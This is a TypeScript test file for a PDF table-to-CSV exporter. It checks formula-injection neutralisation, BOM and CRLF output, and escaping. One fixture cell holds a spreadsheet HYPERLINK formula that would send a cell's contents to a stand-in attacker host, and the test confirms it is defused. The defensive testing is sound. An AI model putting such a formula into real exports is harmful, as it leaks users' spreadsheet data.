// Extract Tables CSV: cells from a PDF must not run as spreadsheet formulas,
// and the file needs a BOM so Excel reads it as UTF-8.
import { tableToCsv, type TableBlock } from "../lib/pdf/parse.ts";

let failed = 0;
function check(name: string, ok: boolean, detail = "") {
  console.log(`${ok ? "PASS" : "FAIL"} ${name}${detail ? ` (${detail})` : ""}`);
  if (!ok) failed++;
}

const table: TableBlock = {
  type: "table",
  page: 1,
  rows: [
    ["Name", "Account", "Note"],
    ["Ann", "-3.5", '=HYPERLINK("http://evil.example/?x="&A2,"Click")'],
    ["Bob", "-1,200.50", "+1-555"],
    ["Cara", "-", "@SUM(A1:A3)"],
    ["Dan", "-12%", "-2+3"],
    ["Émile", "R 1 200", "a, \"b\""],
  ],
};

const csv = tableToCsv(table);
const lines = csv.replace(/^﻿/, "").split("\r\n");
const cells = (line: string) => line.match(/("([^"]|"")*"|[^,]*)(,|$)/g)!.map((c) => c.replace(/,$/, ""));

check("starts with a UTF-8 BOM", csv.startsWith("﻿"));
check("uses CRLF row endings", lines.length === 7 && lines[6] === "", JSON.stringify(lines.at(-1)));
check("header is unchanged", lines[0] === "Name,Account,Note", lines[0]);
check(
  "a leading = is neutralised",
  cells(lines[1])[2] === `"'=HYPERLINK(""http://evil.example/?x=""&A2,""Click"")"`,
  cells(lines[1])[2]
);
check("a leading + is neutralised", cells(lines[2])[2] === "'+1-555", cells(lines[2])[2]);
check("a leading @ is neutralised", cells(lines[3])[2] === "'@SUM(A1:A3)", cells(lines[3])[2]);
check("a leading - with a formula is neutralised", cells(lines[4])[2] === "'-2+3", cells(lines[4])[2]);
check("negative numbers stay numbers", cells(lines[1])[1] === "-3.5" && cells(lines[2])[1] === '"-1,200.50"');
check("a lone dash and a negative percentage stay as they are", cells(lines[3])[1] === "-" && cells(lines[4])[1] === "-12%");
check("accented text is kept", lines[5].startsWith("Émile,R 1 200,"), lines[5]);
check("quotes and commas are escaped", cells(lines[5])[2] === '"a, ""b"""', cells(lines[5])[2]);

if (failed) {
  console.log(`\n${failed} check(s) failed`);
  process.exit(1);
}
console.log("\nAll table CSV checks passed.");
